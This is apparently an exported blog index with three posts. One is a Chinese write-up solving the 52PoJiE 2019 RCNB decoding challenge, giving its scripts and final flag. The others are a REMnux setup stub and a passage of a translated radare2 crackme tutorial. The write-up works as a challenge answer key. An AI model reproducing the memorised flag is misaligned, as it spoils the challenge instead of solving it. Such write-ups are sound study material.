ŕĊŃßŕČŇÞȒcÑƁȑĆŘÇńƃRƈǸƅŕcȠbņÞȑċRƈŇƀȐcňþńÞƦĈɍCȠƀÑBRĉǸƁŗȼȑƇnƁȵßŕƇŖċƞƅřƇǹþŇƄŖÇȠƃRĈǸƅŕƇņþŔĊřƈňbƝßrƈŕÇǸþŃÞȐĆnbȑĉȑȻǸƃǹƀRƇrƈNbnƄrċrĉŅBƦcňþRċňƁnBŗȼÑƁŕċƞßɍĈŗćņƀǹƁȑĈŅþŔƇňƅŗƇrĊǹƄǸßȒƈǹßŕȻȠBŔćƝþŔȻÑBȓĆǸÞȑċŕĉŃþŃƀŘcřȻÑBŅƀɌƈńƄŔĊÑÞƦĈƞƃȓȼņƁŘȻnƄŔćŖċǸƄŅBŖÇȓĉŅBňƄȐȼŖÇņbǹƅrȻÑÞŔČŅßŔĊNþɌƇȠÞRĉnþřčŕċNþȠþƦȼȠƅRĆÑƄŗćŘčŃƄŖÇÑƄǹbȑĆŖÇǹþƞƄȓcƞƁRCǸƄɍćȒČNƅȓȻňÞņBRĆƞbřƇŖcȠbřȻńƄŗĆŃÞŃBƦĉŗĊNþřĊņßȒĆȠƁȑĊŅBȐƈȵBǹƁřcrĉƞbnƀƦċŘȼÑƀȒÇńƁŗCȠƁƝßrĊǹþŗȻŃƀȒȻɍċNßŖĉǸßŃÞrƇȒȼȠƃřƇŃƃNbŘċƦČňƅŔČnBŗČƞbƞßŔȼŔĊȠƀnƅŖċŕčŇƄǹBŔCřċǹƅȐČňƀƝƀřĈŖČȵßńÞɌCǹƃŔćȓċÑþŕȼƝƄȒcńbǹbȓƈƝƅɌĆȠƄŖćǹBŖƈŘÇƝƅƦĉŃƁŃßŖĉNƃŔĉÑƄŖĈƞþȑČȑČnBŃƁŔČnƃȒĈȓĈNBǸßȐCȠßȐčŅbɍĉƞþƦĉrȻŅBŇßȒȻǸƁŘȼŘċńBňbŘčnƄŘÇȒƈŇƅǹÞřćȐćŅÞƦċŇƄŇbɌƇƦƇńƀňƁrČRČņbȑÇŅßȵƅřȼŖĆǸƀŔCƝƀņÞȓƇrĊŇþňbŕÇŃƄŔƈńÞŘČȐĊƝbřȻǹƃɌČȠBńƄȒƇNþřĊɌćņBŕȼȠƃŖƇňþÑßȓȼȑČÑƅnƄɍĉnÞŗcŘƈňßȓĉȵƄȑcNbȠßƦÇŅƃɍĈƦĊnƁŖÇŅBŔcŃƁńƁɌċňÞŕĉƦCņƅƦȻȵƅȓÇǹƃȓĆȠƃRȻňƃřćǸƀŗƈǹßřĉňbȐČńƁɍĈŇÞÑÞŘćŗÇNbŗȻÑÞRƈǸƃǹƀŕȻRĉƞBńþŘȻŔĆƝƁņBŕȻNBRĉņƃȓČƝƁȐċÑƀRČŕƈňƀrčŇƅȐĊŅÞƦȼǹƁňƃȓĊnþřĈŘCnþȠƀȒcƞƃɌćɌĊȵƅŕƇňƃnƄŔčńÞRČřȼńbŇßŕĊňþŘCǹbŔĈnbŕĊńþȑcŃƄŔĈŔčńbȐčȠBřĉŅƃņƃŘƈɌÇÑÞŇƄȓĉɍċňƅńþŗCřČƝƄRCņÞƝƁŔĈRȼNƅȒCnƃɌƇǹßńÞŕƈŇBŘCŕȼÑBȒÇŃÞǸƁȓȼŕČȠþȵƁȑƈńƀŔcȑƇÑßrƈǸÞrcŃÞŇƅȓćɌćńƀɍćňƀȠƅŘȼǸƁɍĊřčƞÞņƃrĊǸƀŗcȓƈńƀŇƀȐcrĊŅBȓĈȠƁɍćnƁnÞɌƇÑƃȐȼƞßŔCɍćƞbƝBȒcņƁrċnBŗƈȓȻńƃɌCÑBƞƀȒČňßŔƇřƇǹbŖcņƃŕĆňþŕČņƅȒĉŇƅȐĈŇƁȠƃRĉŔƇǸþŘĊȵßŔȼńbȑƈȠBǹBɌčȵƃrčǹƄŔȻƞƅŗȼȒĆƞƀŖĉȵbŕcƝÞȒȼńBrċǸƅŘcȠÞȐčƝbȓĊŅbŘCȠƀɍĆȠƅŕĉNƀȠÞŖćřċńƁńþȓĉȠƁƦȻnƀȓÇɍĈŅƅǸƀȓčȒȻņƀǹÞɍcȑĆȵƃrȻƝƀɌCŃþɍĈȵþŖČņßňƅŗĉÑÞŕƈȑcŃƁǸßȒƇȐÇƞßńbŕƈȵBŕƇnƄȓċȑȼȠBɍċŅÞŗċŅƃƦčńƄňÞRÇrcŅƄȐÇȠÞřčȠÞƞBɌȼɍĈŇþɍĉÑƅǸBrĆňƃŖȻŕčȵbņßŘĊƞƀȐƈnþŘčȓȻÑÞŕcńþņbŔȼɌČÑBɌčȵbȑĈŅBŕĉƞƄÑþȒÇȓȻNƀÑßŘĈÑƀȐȼƝBŔĈȵþɍĊÑßŕĉȒȼnþŕÇņbńþɍĆŅÞŗĊŃƃRċņƅŘcNþȑĆŅƁrƈǸƄȒCƝþŖȻrÇŇbřĊŅƅȑƈŃBƦċnßňƅƦĉÑþȓĈřȼŃƀɍcŃƄȵþɌCřĆNƄǹƄƦȻŔčŅƃnƅrċrCǸƄȓƈŃƀrÇnƁrCÑƅrCȵƀrƈǹßrƈȵƁRĆƞƁrÇŇÞȵßƦČȑȼǸƁǹBȑcɌƈƝÞȒĆŅÞrĆňƃRćŇƁȠƅȓcrc 这里给了一个网站，上面可以解密，得到明文 md 文件： 12345678910111213141516171819202122232425262728293031323334# Prove your NiubilityHello there, Welcome to the 52PoJiE Spring Festival 2019 Challenge - RCNB.To prove you are as NB as RC, complete this trial![It&apos;s dangerous to go alone, take this!](//rcnb.xyz)And the key: Which_is_N0t_Th3_Answ3rWith the trial:7z��&apos;�G�֐&apos;�l×v����2!���!$�x�Z�ˤ�XЂY�=��W�K�ï�z���������r�$]�I��q�Ib��iԎ�2C���Z�`�3��EW�w3X�� ��*2� &apos;]�Kz�,&lt;` ��5�&amp;�QT�~�z�rq+�I�1԰����r?�R���Y�5X�&lt;rA���U��[���G��^*�O- GP���l����.:�7�3��:*J(v��]��,�h����nOˁ��X�&amp;�6�=Z\\����g�h�y6I��nNJ�)�&amp;���yCE��A��#� 8��ȍr&apos;�M\\?o:��W��Va�)����D��.�5V��Gi��A��)�,~� H¬?���&amp;��V�����~_;�P|�($�e00&quot;��荈&#123;�����8�]�-1��_Z��G=�)oPd��)���w;����8zOi��|&amp;���]à�&apos;�C�q�����SD&gt;��!��b��_� |�F�-�&apos;����-�ڷ���畢&#123;�ٙ�� �ti��E��ޕ;�����[&apos;��Yl�י*b����G�1�B�����~�:�و��׉��Aenqd�)ü#�EG-:�S/�ACb_[�V�H�l=Vg�-�۴�b7&amp;���ihCz��KLE0��)��H咣BT�0(k����m�&quot;�`��b�ĥq�&lt;IU�1������\\��[�k��%���&quot;ɡ�菽a8��H��gb��Q J��ZLL���_�$�|�ɡ����R�E�wu��t7#)S�\\�����;&#123;l�W�����I�*Y��&#125;��GN�p�k*�?�2�@�S�&#125;���33���v ���/���^Ӈ��!�R�N��F��5[�2�bvX ��ߍ�E؞%���d��� ��T�@��dy��r��B� ��?aHx�����&quot;�g����呴^+��|t$&#125;�x�C.���bp�X�lU|��&amp;׶��&#125;(���O�eq8s=店�C�#^�c�Q��&gt;�8��^���֙���b6&amp;��i�5FT�m$5�|�X�tA���s��&#125;��.h���Y��r�&#125;�(�,�&lt;W���V�����`�V08K�� -V�CV��&#125;�~d��� 0�y�� q����wWxZe��#q&quot;�״�=�%��h�!��_�������#��ᷫDA8^kJqɊ�=E�&#123;%�m&gt;��k� p $�SL˓`��]y bv�� 最后面给出的 trial 看开头显然是个 7z，那上面的 key 应该就是密码了。我把它存为一个新文件，然而这个字符�严重干扰了我好几个小时，让懵逼的我一度以为这是题目设计的加密。一开始我xxd了一下文件，发现有三个字节efbfbd频繁出现 505 次： 根据 7z 文件头377a bcaf 271c 0004尝试过替换，一度以为掉进了脑洞的陷阱。直到我看到这篇文章，才知道这串字节就是那个字符。 后来在 github 上找到了 rcnb 的源码，修改 js，将明文每个字节以 int 的形式输出，再用 python 一跑拿到压缩包： 123456789function printRes(str) &#123; var res = rcnb.decode(str); for (var i = 0; i &lt; res.length; i++) &#123; console.log(res[i]); &#125; // console.log(res)&#125;printRes(\"ŘĈÑƀƝƄŘȻŖĊǸƀrcnƃňßɍĉƞƀRČņbRÇrcnbrcnbrcnbŖĊƝƃrcnbrcnbrcnbrČNþȓĉƞƁnƅŔƇńÞrćǹƁȓĆÑƅŔȼŕÇƞƅƞßȐCŅƁȐƇŖĆňƁɌƇȵƃȑĈȠƃNƃƦčƝƄȓĉŕČňƃŇbȐĆȑćnƅŘȼȵßƞßRĆǸƄɌCƞBȑĊŅÞŗĊɌȼŃßŇƁŔcŔƈǹÞȠƁɌĆńƅɍĉƝÞŖÇɌcŇƅŖĆnþńƁȓČňƄŘȻȓȻnƃǸƁɌCȒćȵƁȵƄɌCŅƅȐčŃƀřCřƇŇƁǸþřÇƞbƦČnbRCƝßȐćǹƁŔȻřȻņBǹBȑċŗÇƞƃȠBɌĆÑƃŕčņƃȓƇńbŖčÑbɌĊŗƈÑBRcƞƁȑƇńÞƦČǹƀǸƀŘcŘȻnƅRCņƃŅƄȐĉNÞŘĈÑƄŕčȐćǹbŇÞȓćǹßɌĈŔȻňƀƝbȐÇrCǹÞȓȻŃBńƄɍċńbɌČŗƇnƅȵƀŗċņßRCŇbřČřćÑƀȐĊŃbǸƅɍcȑCȵbǸßȑƇȑCǹƅŘȻŃƃřċŃþnƄRċǹBrƇńƃŖĈȑĉņbƞƅƦĆrCƝÞƦĆÑBņƄrćȑƇÑƅńƄƦƇŗĆnƀŔĆȠƄȐćNƀÑƅƦȼȓĉŇƄȵßȑCǹƄȐȼŗćȠƃŅBȓCȠƁŔċƝßřcŘčŅbƦĊƝƃɌċƞƀnƁŘȻÑbŖčŗCnþȒȻÑƅNþřȼrƈNƁŕĆƝBȐÇňƅȐCŃßŅƄrćƞƀȓĊńƃŖƇǸƁřċŘćŃƁŘȼÑƅȑċȵƀŃþrƇŃßŕĉrćNþȒȻƝƁɌƈȠbƦĊNƅŔCƝßȓČńÞƦċŇbŖƈņƃŖĉȵþnƃɍĉɌƈňÞřčǹBȠbŕĉřċńþņƄȑÇƞƁȒcŘĉǸƅňƃȒcŔĈńßǹƁƦćȓȼǹƁÑƁƦCȑċŇƄȓƈnƄȵƄrcŘčnƃȵßRčȑcNƁrĊNƅȐÇŇƁņƁȒčnƀɌČňbɌĆrȼƞÞŇƃɌCřÇnþňƅȒȼƝBȑcȐȻnBňƁȑċȓcȠbǹþȑƇǹƁrĈŖƈňƁŗcȵbňþřȼƦĈŃƅňßŗcŃƀƦĊŔcńÞŖĉȠƅŃƁȑĊȐÇȠþƞÞɌƇȵƅȐȼɍĉÑBrƇŇƅŔčƞßnƅŗĈɍĆȵƅŖČņbŖĆȠÞȒċÑƃŗċNƃŕȻŃÞNÞŔčŕĆƞƃNƃRČȐĆņƁŃƀřċŃbȓčƝƃȑcŔĆNþȑčȠbŗĆNþŇƁȓčrčŃƄȑĉnþŅþȓȻřcÑƄŖƇÑßȐĆńbŅbŕĊŃßŕČŇÞȒcÑƁȑĆŘÇńƃRƈǸƅŕcȠbņÞȑċRƈŇƀȐcňþńÞƦĈɍCȠƀÑBRĉǸƁŗȼȑƇnƁȵßŕƇŖċƞƅřƇǹþŇƄŖÇȠƃRĈǸƅŕƇņþŔĊřƈňbƝßrƈŕÇǸþŃÞȐĆnbȑĉȑȻǸƃǹƀRƇrƈNbnƄrċrĉŅBƦcňþRċňƁnBŗȼÑƁŕċƞßɍĈŗćņƀǹƁȑĈŅþŔƇňƅŗƇrĊǹƄǸßȒƈǹßŕȻȠBŔćƝþŔȻÑBȓĆǸÞȑċŕĉŃþŃƀŘcřȻÑBŅƀɌƈńƄŔĊÑÞƦĈƞƃȓȼņƁŘȻnƄŔćŖċǸƄŅBŖÇȓĉŅBňƄȐȼŖÇņbǹƅrȻÑÞŔČŅßŔĊNþɌƇȠÞRĉnþřčŕċNþȠþƦȼȠƅRĆÑƄŗćŘčŃƄŖÇÑƄǹbȑĆŖÇǹþƞƄȓcƞƁRCǸƄɍćȒČNƅȓȻňÞņBRĆƞbřƇŖcȠbřȻńƄŗĆŃÞŃBƦĉŗĊNþřĊņßȒĆȠƁȑĊŅBȐƈȵBǹƁřcrĉƞbnƀƦċŘȼÑƀȒÇńƁŗCȠƁƝßrĊǹþŗȻŃƀȒȻɍċNßŖĉǸßŃÞrƇȒȼȠƃřƇŃƃNbŘċƦČňƅŔČnBŗČƞbƞßŔȼŔĊȠƀnƅŖċŕčŇƄǹBŔCřċǹƅȐČňƀƝƀřĈŖČȵßńÞɌCǹƃŔćȓċÑþŕȼƝƄȒcńbǹbȓƈƝƅɌĆȠƄŖćǹBŖƈŘÇƝƅƦĉŃƁŃßŖĉNƃŔĉÑƄŖĈƞþȑČȑČnBŃƁŔČnƃȒĈȓĈNBǸßȐCȠßȐčŅbɍĉƞþƦĉrȻŅBŇßȒȻǸƁŘȼŘċńBňbŘčnƄŘÇȒƈŇƅǹÞřćȐćŅÞƦċŇƄŇbɌƇƦƇńƀňƁrČRČņbȑÇŅßȵƅřȼŖĆǸƀŔCƝƀņÞȓƇrĊŇþňbŕÇŃƄŔƈńÞŘČȐĊƝbřȻǹƃɌČȠBńƄȒƇNþřĊɌćņBŕȼȠƃŖƇňþÑßȓȼȑČÑƅnƄɍĉnÞŗcŘƈňßȓĉȵƄȑcNbȠßƦÇŅƃɍĈƦĊnƁŖÇŅBŔcŃƁńƁɌċňÞŕĉƦCņƅƦȻȵƅȓÇǹƃȓĆȠƃRȻňƃřćǸƀŗƈǹßřĉňbȐČńƁɍĈŇÞÑÞŘćŗÇNbŗȻÑÞRƈǸƃǹƀŕȻRĉƞBńþŘȻŔĆƝƁņBŕȻNBRĉņƃȓČƝƁȐċÑƀRČŕƈňƀrčŇƅȐĊŅÞƦȼǹƁňƃȓĊnþřĈŘCnþȠƀȒcƞƃɌćɌĊȵƅŕƇňƃnƄŔčńÞRČřȼńbŇßŕĊňþŘCǹbŔĈnbŕĊńþȑcŃƄŔĈŔčńbȐčȠBřĉŅƃņƃŘƈɌÇÑÞŇƄȓĉɍċňƅńþŗCřČƝƄRCņÞƝƁŔĈRȼNƅȒCnƃɌƇǹßńÞŕƈŇBŘCŕȼÑBȒÇŃÞǸƁȓȼŕČȠþȵƁȑƈńƀŔcȑƇÑßrƈǸÞrcŃÞŇƅȓćɌćńƀɍćňƀȠƅŘȼǸƁɍĊřčƞÞņƃrĊǸƀŗcȓƈńƀŇƀȐcrĊŅBȓĈȠƁɍćnƁnÞɌƇÑƃȐȼƞßŔCɍćƞbƝBȒcņƁrċnBŗƈȓȻńƃɌCÑBƞƀȒČňßŔƇřƇǹbŖcņƃŕĆňþŕČņƅȒĉŇƅȐĈŇƁȠƃRĉŔƇǸþŘĊȵßŔȼńbȑƈȠBǹBɌčȵƃrčǹƄŔȻƞƅŗȼȒĆƞƀŖĉȵbŕcƝÞȒȼńBrċǸƅŘcȠÞȐčƝbȓĊŅbŘCȠƀɍĆȠƅŕĉNƀȠÞŖćřċńƁńþȓĉȠƁƦȻnƀȓÇɍĈŅƅǸƀȓčȒȻņƀǹÞɍcȑĆȵƃrȻƝƀɌCŃþɍĈȵþŖČņßňƅŗĉÑÞŕƈȑcŃƁǸßȒƇȐÇƞßńbŕƈȵBŕƇnƄȓċȑȼȠBɍċŅÞŗċŅƃƦčńƄňÞRÇrcŅƄȐÇȠÞřčȠÞƞBɌȼɍĈŇþɍĉÑƅǸBrĆňƃŖȻŕčȵbņßŘĊƞƀȐƈnþŘčȓȻÑÞŕcńþņbŔȼɌČÑBɌčȵbȑĈŅBŕĉƞƄÑþȒÇȓȻNƀÑßŘĈÑƀȐȼƝBŔĈȵþɍĊÑßŕĉȒȼnþŕÇņbńþɍĆŅÞŗĊŃƃRċņƅŘcNþȑĆŅƁrƈǸƄȒCƝþŖȻrÇŇbřĊŅƅȑƈŃBƦċnßňƅƦĉÑþȓĈřȼŃƀɍcŃƄȵþɌCřĆNƄǹƄƦȻŔčŅƃnƅrċrCǸƄȓƈŃƀrÇnƁrCÑƅrCȵƀrƈǹßrƈȵƁRĆƞƁrÇŇÞȵßƦČȑȼǸƁǹBȑcɌƈƝÞȒĆŅÞrĆňƃRćŇƁȠƅȓcrc\"); 1234567891011#!/usr/bin/env pythonf = open('plain_array.txt', 'rb')t = f.read()f.close()data = t.split('\\n')[:-1]print len(data)# print dataf = open('trial.7z', 'wb')for i in range(len(data)): f.write(chr(int(data[i])))f.close() 解压后拿到一个新文件nb，还是被加密了的： 1ȐȼŃƁȓĉnƅŕƇŅƀȓƇŃƅȒċƝþŕƇNƄɌćŃÞɌCȵBȒČNƄɌCňƀɌćÑbȒCŅÞŕƇŇƁȓƇńƁŕƇŅƅȒCņbȒċƝÞȒƈƝƀȒČnƁɌćŃÞȓƈȠƅȓƇNþɌcńBȓĊǸƁȒȼȵbȒƈnbɌCȵßȒȼȠÞȓĉNƁŗćƝƅRćŇbƞƅRȻÑßŘȻŇƁrĊńßŕčȠþRĉNƁƦĈņBƦcǹÞƦćŃbƦĈNƁƦĈȒćƝÞnƅŔĆņÞrȼȒćƝþǸßRĊńþrȻNþrČńßŕčǸÞRĊȵÞrȼȵbŕƇŇÞrĊnÞŔĆnBŘÇƝƃrĉǹþƦćņƅƦcȵƀƦćņBƦcǹÞƦćŃbƦĈNƁƦĈȒćƝÞnƃŔĆǸþRĊƝƃrĉňÞƦĉřƇƞþȵƅrȼņbrCnƃŔĆņßRćńßrȻńßŕčŃBRĊƞƅřȻƞƀřƇǹþƦćȵÞřƈƞþřȻŅþƦcǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞßřȻņƁƦcǹþƦćņƄƦcƞƄřȻņBƦcǹÞƦćŃbƦĈȵƀƦćȒćƝÞŃƄŔCƞÞřȻŅþƦcňÞƦĉřƇƞþȵƅrȼņbrCŃƄŔCƞßřȻŅÞƦcǹÞƦćȵƄřƈȵƀƦćŅÞƦcňÞƦĉȵƁřƈŅßřƇȒćƝþŃBRĊƞßřȻņƀƦcňÞƦĉȵƄřƈƞÞřȻņƀƦcǹÞƦćNþƦĈƞƅřȻņƀƦcňÞƦĉȵƄřƈƞþřȻŇbřƇǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞƄřȻȒćƝÞnƃŔĆǸþRĊŇƅrĊŃBrČŃƃŔċńþrȻŅbrċǹÞƦćȵÞřƈȓčnÞnƅrćǸƃŔćÑþŘȻȠBŘĊȵƅŕċRćņßƝƃŔƇȵƅrƇŅÞƦcǹÞƦćȵƁřƈȓčnƄNþřĆŃƃŔċÑƀrÇƞƀřƇǹþƦćņƄƦcƞƅřȻņƁƦcňÞƦĉņƄƦcňßƦcņƀƦcǸßřȻȵƃřƈňßƦcŇBřƇǸƄřȻņƄƦcȵƀƦćȒćƝÞǸbŔćňÞRČNƅŘCǹÞƦćŃbƦĈňÞƦcƞƀřƇǸƄřȻȒĉŅBǹÞrčȠbrčŅÞŔcÑƃRCȵbŕƇnƅrćŃƄŔCƞßřȻŅÞƦcňÞƦĉȵƁřƈƞƄřȻŇbřƇňÞƦĉȵƁřƈŅßřƇŇBřƇǸƁřȻņƄƦcƞßřȻƞƀřƇǹþƦćȵÞřƈÑbřȻřČȵßǸÞRĊǸþRĊǹÞrčȠbrčǸbŔćņþRćȠƃŘĊŃƄrČŃBRĊƞƅřȻņƀƦcǸƁřȻņƄƦcƞƅřȻƞƀřƇǹÞƦćȵƀřƈNƁƦĈƞƀřƇňÞƦĉȵƄřƈƞþřȻŇbřƇǸƁřȻņƄƦcƞƄřȻņBƦcǸßřȻȵþřƈȵƀƦćȒćƝƄȵƅŔȻNƅRĉǸƅŘCņbrCȠBŔĆŅßřƇřČȵƁȵƅŔȻńþrȻƝƃrĉǸƃřȻȵÞřƈNƁƦĈņBƦcňÞƦĉȵƁřƈŇbƦĆŅÞƦcǹþƦćņƅƦcȵƀƦćŇBřƇǸƅřȻȵþřƈƞßřȻņƀƦcǸƄřȻȵƄřƈȵƀƦćņƀƦcǹÞƦćŃbƦĈNƁƦĈņƁƦcǹÞƦćNþƦĈƞßřȻřČȵƅnƃŔĆƝƃrƈǹƀŕĉŇÞrĊnƃŔĆȵƁrȼņbŔcŃƃrČǸbŔćņßRćÑƀrƇǸßřȻņƄƦcƦȼŇƅnßrćǹbRĊŅbrȻǹÞŕĊňÞƦĉřƇÑbǸþŕĉńƅŕčƞƀRȻÑBRCƝBrƈŃbřĆŃÞŖĊnƀŘÇǹƀŕĉŇƄrĊƝƃŔƇȵƄrȼŃƀrČņBrCȠþRĉňßƦcřċÑƅRĆŇþŖƇŃÞǹƅƦćȒĉŅBȵƁrȼňßŕċȠßŔčƞßřȻņƁƦcǹÞƦćřƇƞþǹÞrčņbrCnƃŔĆÑƃRCȵbŕƇņbrCnÞŔĆnBŘÇŇƅrĊŃƄrČŃBRĊƞƅřȻņƀƦcǸƃřȻȵßřƈƞßřȻƞƀřƇǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞßřȻƞƀřƇǹÞƦćȵÞřƈƞƄřȻŇBřƇǸƅřȻȵþřƈƞƅřȻȒćƝƅŃÞŖĊnBŘÇŅbrȻȠBrčǸÞRĊǸßRĊŅßŔcŃƁřĆǹbRĊȵßrȼƞbŘČŇþrĊǸÞRĊÑBRCǹƄrčńƅŕčŃƄŔCƞßřȻņƁƦcǹÞƦćȵÞřƈȓČŃƅƝƅƦcNþƦĈňßƦcņBƦcǹßƦćńßřƇňßƦcņƀƦcǸƅřȻřčȠbŅþƦcǹƅƦćȵƄřƈƞÞřȻƞƀřƇ 然后一层层解密拿到 key： 1234567Well done! It seems that you have great programming skills.ȐȼŃßɌCȵƃȒȼȵbȒƈnbɌÇńßɌĈȠƃȒȻŃBȓƈȠƃȒȼȵbȒČŃBɌCňƀȒĊŇßɌcńþȓČŇƁŕƇņÞȒȻŃƄŕƇŅƅȓƇŃƃȒȼȠbȒCņƁɌCňƀȒCŅƀȒĉȠƀɌćÑbɌcŅƄɌĉņƄȒȻńƄɌĉŇÞŕƇņÞȒȻŃƄŕƇŃbȒČŃƄŕƇńBȒČnƁȓȼǸßŗĆnƀȒćnþŕƇnþȓƇńƅɌƇƝƄřĈƝßŗƇȠbȓčȵbȒȼƞþŗcŅƅȑĉȠƁȒCŅƀɌćŃÞɌćÑßŕƇŅþȓČňBɌČŅƅȓĊǸƄɌcńƄŕƇńþȒĆȵþɌĉŇÞŕƇŃƃřčȠbřċȵƀȓCÑBřćŃBŖČȵƃɌćǸƀȓƈȠßŘčŅƄŗĉȠƄȒȼȵƅȒȻŅBȒĆƝƃȒĈÑƄȓĊņBřƇNƁɌƇƞbɌCƝßȐĉņþƦȻƝƃŗĈńƀɌCƝB;) ȐcňÞŗcŅƅȒCŅƀȒĉȠƀȒȻŃƄɌcńƄŖċŅþŕƇņÞȒȻŃƄŕƇŅþȒČŃßŘčńbƦȻŇƅɌČÑþɌƈǹƃɌĉŅßȒCŅƅȒČnBƦȻƝƃȑÇƝƄŘCNƁȐĉņþ 1234567Well done! It seems that you have great programming skills.Wishing you happiness during the holidays and throughout the New Year!- by Coxxs@52PoJiE, [Want to know more about RCNB.js?](https://github.com/Coxxs/RCNB.js);) Oh, and here&apos;s the key: N0w_y0u_are_NB_A5_RC 感谢的话最后感谢吾爱破解大佬们的辛勤付出！ 参考网站https://github.com/Coxxs/RCNB.jshttps://travis-ci.com/Coxxs/RCNB.jshttps://liudanking.com/golang/utf-8_replacement_character/https://www.52pojie.cn/thread-873265-1-1.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"【转】Installing Minimal Ubuntu for REMnux","slug":"【转】Installing-Minimal-Ubuntu-for-REMnux","date":"2019-02-20T14:10:38.000Z","updated":"2019-08-26T01:14:27.402Z","comments":true,"path":"2019/02/20/【转】Installing-Minimal-Ubuntu-for-REMnux/","link":"","permalink":"qianfei11.coding.me/2019/02/20/【转】Installing-Minimal-Ubuntu-for-REMnux/","excerpt":"因为 google drive 上下载 REMnux 的 ova 实在是太慢了，在官方文档上看到了可以用 ubuntu 来弄。这里记录一下安装Ubuntu 14.04 64-bit minimal ISO的过程。搬运自这里。","text":"因为 google drive 上下载 REMnux 的 ova 实在是太慢了，在官方文档上看到了可以用 ubuntu 来弄。这里记录一下安装Ubuntu 14.04 64-bit minimal ISO的过程。搬运自这里。","categories":[],"tags":[{"name":"repost","slug":"repost","permalink":"qianfei11.coding.me/tags/repost/"}]},{"title":"【译】Radare2之旅-Part1：Simple crackme","slug":"【译】Radare2之旅-Part1：Simple-crackme","date":"2019-02-18T04:17:27.000Z","updated":"2019-08-26T01:13:50.215Z","comments":true,"path":"2019/02/18/【译】Radare2之旅-Part1：Simple-crackme/","link":"","permalink":"qianfei11.coding.me/2019/02/18/【译】Radare2之旅-Part1：Simple-crackme/","excerpt":"翻译自Megabeets。","text":"翻译自Megabeets。 序言过去一年里的 CTF 比赛中，不论是逆向工程（RE）还是漏洞挖掘（PWN），我一直在用radare2。我发现radare2对于很多 CTF 的题目来说都很有用，极大地缩短了我的做题时间。遗憾的是熟悉 radare2 的人太少了。可能大家都习惯了使用IDA Pro、OllyDBG还有gdb，或者没有听说过它。不管怎么样，我都认为radare2应该成为你工具箱中的一部分。 因为我真的特别喜欢这个项目，而且我希望能有越来越多的人开始熟悉它、使用它，能对项目做出一些贡献。我计划写一系列的文章以及使用r2的例子。因为那些文章都涉及radare2的特点和功能，我会解释的更加详细。 radare2radare2是一个逆向工程和二进制分析的开源框架，它有很多命令行接口，包括反汇编、分析数据、打补丁、比较数据、查找、替换、可视化等等功能。同时它可以在几乎所有的主要操作系统（GNU/Linux、.Windows、*BSD、iOS、OSX、Solaris等等）上运行，并且支持许多 CPU 架构和文件格式。他所有的特点可以展现出一个思想——radare2是绝对自由的。 该框架是一个工具的集合，既可以在r2给出的 shell 下使用，又可以独立使用——比如我们将要了解的rahash2、rabin2、ragg2三个组件。所有的组件赋予了radare2强大的静态或动态分析、十六进制编辑以及漏洞挖掘能力（在接下来的文章中我会更深入地讲述）。 我们必须意识到学习r2是一个十分艰难的过程——虽然r2有 GUI 和 WebUI。在我看来，IDA 的 GUI 和方便性确实更佳。但是它的命令行接口，包括其可视化模式，仍然是radare2的核心以及魅力所在。因为它的复杂性，我会尽力讲得浅显易懂。 在开始之前，你可以看一看“r2、IDA Pro 和 Hopper 等工具间的比较”来了解它。 获取radare2下载radare2的环境配置非常快——我们每天都会更新，所以更推荐你去使用 git 的版本，而不是稳定版本。有时候稳定版本可能没有 git 版本更稳定。 123$ git clone https://github.com/radare/radare2.git$ cd radare2$ ./sys/install.sh 如果你不想下载 git 版本或者你想要不同操作系统（Windows、OS X、iOS等等）上的可执行文件，可以在radare2 官网下载界面查看。 更新正如我之前所说的，更推荐大家使用 git 仓库里最新版的r2。从 git 更新r2只需要执行： 1$ ./sys/install.sh 然后你就能从 git 获得最新的版本。我通常每天早上会更新一下radare2，在这期间可以看看一会儿视频消遣。 卸载我实在想不出什么理由会让你在看这篇文章时想要卸载radare2。如果要卸载的话只需要执行： 12$ make uninstall$ make purge 开始学习你可以在这里下载 Crackme。 现在你已经在自己的系统上下载了radare2和文件，我们可以开始探索radare2的基础使用。我会在REMunx上调试，大部分的命令和说明跟Windows或者其他系统上是一样的。 命令行参数和大部分命令行工具一样，查看可选参数的方式是执行-h参数： 1$ r2 -h 我不把完整的输出放上来，而是放一些我日常工作中常用的参数： 12345678910111213Usage: r2 [-ACdfLMnNqStuvwz] [-P patch] [-p prj] [-a arch] [-b bits] [-i file] [-s addr] [-B baddr] [-M maddr] [-c cmd] [-e k=v] file|pid|-|--|=-d: Debug the executable 'file' or running process 'pid'-A: Analyze executable at load time (xrefs, etc)-q: Quiet mode, exit after processing commands-w: Write mode enabled-L: List of supported IO plugins-i [file]: Interprets a r2 script-n: Bare load. Do not load executable info as the entrypoint-c 'command; command; ...': Run r2 and execute commands (eg: r2 's main; px 60')-p [prj]: Creates a project for the file being analyzed-: Opens r2 with the malloc plugin that gives a 512 bytes memory area to play with 二进制信息面对一个新的文件时，我第一件想做的事就是获取文件的信息。我们可以使用r2框架中最强大的工具之一——rabin2来获取信息。 rabin2可以从二进制文件中获取信息，包括区段、文件头、导入导出表、字符串、入口点等等。同时具有不同的格式的输出。rabin2支持ELF、PE、Mach-O、Java CLASS等文件。 使用man rabin2查看更多的信息。 我们执行rabin2并使用参数-I输出二进制信息，例如操作系统、语言、字节序、框架以及保护技术（比如Canary、PIC、NX）等等。 123456789101112131415161718192021222324252627$ rabin2 -I megabeets_0x1havecode truepic falsecanary falsenx falsecrypto falseva trueintrp /lib/ld-linux.so.2bintype elfclass ELF32lang carch x86bits 32machine Intel 80386os linuxminopsz 1maxopsz 16pcalign 0subsys linuxendian littlestripped falsestatic falselinenum truelsyms truerelocs truerpath NONEbinsz 6220 你可以清楚地看到，这是一个 32 位 elf 文件，没有符号表并且是动态链接。它没有任何漏洞利用技术——下一篇文章我们讲学习使用radare2来对漏洞进行利用。让我们跑一下程序，看看它做了什么。 注意：虽然我可以向你保证这个程序是安全的，但是逆向一个未知的程序时，务必在一个虚拟环境下运行。 不过你可以相信我，因为程序确实是安全的。😛 1234567891011$ ./megabeets_0x1 .:: Megabeets ::.Think you can make it?Nop, Wrong argument.$ ./megabeets_0x1 abcdef .:: Megabeets 